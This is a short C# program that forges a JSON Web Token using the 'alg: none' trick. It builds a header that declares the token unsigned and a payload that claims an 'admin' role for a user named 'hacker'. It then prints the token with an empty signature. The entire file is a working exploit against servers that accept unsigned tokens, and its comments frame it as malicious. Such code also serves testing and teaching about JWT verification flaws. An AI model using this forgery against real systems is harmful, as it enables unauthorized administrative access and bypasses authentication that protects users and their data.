using System.Text;
using System.Text.Json;

class Program
{
    static void Main()
    {
        // 1. The Malicious Header
        // We tell the server: "Trust me, I am not signed."
        var header = new { alg = "none", typ = "JWT" };

        // 2. The Malicious Payload
        // We inject the "admin" role
        var payload = new 
        { 
            sub = "hacker", 
            role = "admin", 
            iat = DateTimeOffset.UtcNow.ToUnixTimeSeconds() 
        };

        // 3. Encode & Assemble
        string b64Header = Base64UrlEncode(JsonSerializer.Serialize(header));
        string b64Payload = Base64UrlEncode(JsonSerializer.Serialize(payload));

        // CRITICAL: The structure is "Header.Payload.Signature"
        // Since alg is none, the signature is empty, but the trailing DOT must remain.
        string forgedToken = $"{b64Header}.{b64Payload}.";

        Console.WriteLine(forgedToken);
    }

    static string Base64UrlEncode(string input)
    {
        var bytes = Encoding.UTF8.GetBytes(input);
        return Convert.ToBase64String(bytes)
            .TrimEnd('=')       
            .Replace('+', '-')  
            .Replace('/', '_'); 
    }
}